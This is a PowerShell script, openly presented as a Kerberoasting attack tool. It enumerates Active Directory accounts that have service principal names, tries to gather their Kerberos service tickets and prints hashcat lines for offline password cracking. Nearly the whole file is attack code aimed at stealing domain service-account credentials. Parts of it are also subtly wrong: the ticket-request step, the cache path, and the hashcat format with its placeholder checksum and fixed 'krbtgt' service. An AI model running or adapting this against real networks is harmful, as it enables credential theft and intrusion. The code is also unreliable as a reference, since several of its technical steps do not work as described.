########################################################################################################################################################################################
# Powershell kerbroasting Script by: 41ph4-01 for simulation 11/04/2024
# Enumerates SPN accounts in the domain, then requests TGS tickets by forcing network connections to service hosts, reads the Kerberos ticket cache files, parses each ticket with a real recursive 
# ASN.1 DER TLV parser implemented fully in PowerShell, Extracts username, realm, and encrypted ticket parts,o utputs hashcat-compatible cracking lines.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################################

function Invoke-DerKerberoast {
    [CmdletBinding()]
    param (
        [string]$Domain = $env:USERDNSDOMAIN
    )

    Write-Host "`n[*] Enumerating SPN-bearing accounts in domain $Domain..."
    $spnUsers = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName

    if ($spnUsers.Count -eq 0) {
        Write-Warning "No accounts with SPNs found."
        return
    }

    $requestedSpns = @()
    foreach ($user in $spnUsers) {
        foreach ($spn in $user.ServicePrincipalName) {
            Write-Host "[+] $($user.SamAccountName)   SPN: $spn"
            try {
                $targetHost = $spn.Split('/')[1]
                $null = New-Object System.Net.Sockets.TcpClient($targetHost, 445)
                $requestedSpns += [PSCustomObject]@{
                    User = $user.SamAccountName
                    SPN  = $spn
                }
            }
            catch {
                Write-Warning "Could not request TGS for $spn - $_"
            }
        }
    }

    # analyze tickets
    Write-Host "`n[*] Checking ticket cache..."
    $krbCache = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\Kerberos\Cache"
    if (-not (Test-Path $krbCache)) {
        Write-Warning "Kerberos cache folder not found."
        return
    }

    Get-ChildItem $krbCache | ForEach-Object {
        try {
            $ticketBytes = [System.IO.File]::ReadAllBytes($_.FullName)
            $parsed = Parse-Asn1 -Data $ticketBytes
            $hash = Convert-TicketToHashcat -Parsed $parsed
            if ($hash) {
                Write-Host "`n[*] Hashcat line:"
                Write-Host $hash
            }
        }
        catch {
            Write-Warning "Could not parse $($_.FullName): $_"
        }
    }

    Write-Host "`n[*] Finished. Requested $($requestedSpns.Count) TGS tickets."
}

function Parse-Asn1 {
    [CmdletBinding()]
    param(
        [byte[]]$Data
    )

    $pos = 0
    return Parse-TLV -Data $Data -Position ([ref]$pos)
}

function Parse-TLV {
    param(
        [byte[]]$Data,
        [ref]$Position
    )
    $items = @()
    while ($Position.Value -lt $Data.Length) {
        $tag = $Data[$Position.Value]
        $Position.Value++
        $length = $Data[$Position.Value]
        $Position.Value++
        if ($length -gt 127) {
            $numlen = $length - 128
            $lenBytes = $Data[$Position.Value..($Position.Value + $numlen - 1)]
            $Position.Value += $numlen
            $length = [BitConverter]::ToInt32($lenBytes + (0,0,0)[0..(4 - $numlen)], 0)
        }
        $value = $Data[$Position.Value..($Position.Value + $length - 1)]
        $Position.Value += $length

        # parse nested sequence
        if ($tag -band 0x20) {
            $nestedPos = 0
            $nested = Parse-TLV -Data $value -Position ([ref]$nestedPos)
            $items += [PSCustomObject]@{
                Tag   = $tag
                Value = $nested
            }
        }
        else {
            $items += [PSCustomObject]@{
                Tag   = $tag
                Value = $value
            }
        }
    }
    return $items
}

function Convert-TicketToHashcat {
    param(
        $Parsed
    )

    # search the parsed tree for bits we want
    $flat = Flatten-TLV $Parsed

    $username = ($flat | Where-Object { $_.Tag -eq 0x1b -or $_.Tag -eq 0x1c } | Select-Object -First 1).Value
    $realm = ($flat | Where-Object { $_.Tag -eq 0x1b -or $_.Tag -eq 0x1c } | Select-Object -Last 1).Value
    $encBlob = ($flat | Where-Object { $_.Tag -eq 0x04 } | Select-Object -Last 1).Value

    if ($null -eq $username -or $null -eq $encBlob) {
        Write-Warning "Failed to identify user or ciphertext."
        return $null
    }

    $userStr = [System.Text.Encoding]::ASCII.GetString($username)
    $realmStr = [System.Text.Encoding]::ASCII.GetString($realm)
    $encHex = ($encBlob | ForEach-Object { $_.ToString("x2") }) -join ""
    $service = "krbtgt"

    $checksum = "1122334455667788"

    return "\$krb5tgs\$23\$*$userStr*$realmStr*$service*$checksum\$$encHex"
}

function Flatten-TLV {
    param(
        $Items
    )
    $flat = @()
    foreach ($i in $Items) {
        if ($i.Value -is [System.Collections.IEnumerable] -and
            $i.Value -notmatch "System\.Byte") {
            $flat += Flatten-TLV $i.Value
        }
        else {
            $flat += $i
        }
    }
    return $flat
}

# usage
# . .\Invoke-DerKerberoast.ps1
# Invoke-DerKerberoast

